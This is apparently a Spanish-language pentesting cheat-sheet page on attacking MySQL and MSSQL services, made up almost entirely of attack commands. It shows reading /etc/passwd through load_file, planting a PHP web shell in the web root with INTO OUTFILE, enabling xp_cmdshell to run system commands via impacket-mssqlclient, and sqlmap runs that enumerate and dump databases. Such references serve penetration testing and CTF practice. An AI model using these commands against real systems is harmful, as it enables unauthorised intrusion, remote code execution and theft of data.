---
title: "SQL (MySQL/MSSQL)"
layout: "single"
category: "Servicios"
slug: "servicios/sql"
date: "2025-11-26"
---

### MySQL (3306)
```bash
mysql -h <IP> -u root -p
show databases;
select load_file("/etc/passwd");
select "<?php system($_GET['c']); ?>" into outfile "/var/www/html/shell.php";
```

### MSSQL (1433)
```bash
impacket-mssqlclient user:pass@<IP>
> enable_xp_cmdshell
> xp_cmdshell whoami
```

### SQLMap
```bash
sqlmap -u "http://site.com?id=1" --dbs --batch

## Si no funciona la anterior, capturar la peticion con burpsuite y meterla al fichero req.txt
## basta con "recargar" la pagina en la que queremos probar la request
sqlmap -r req.txt --dbs --batch

#Opciones:
-D <database>
-T table

--tables
--columns
--dump
```
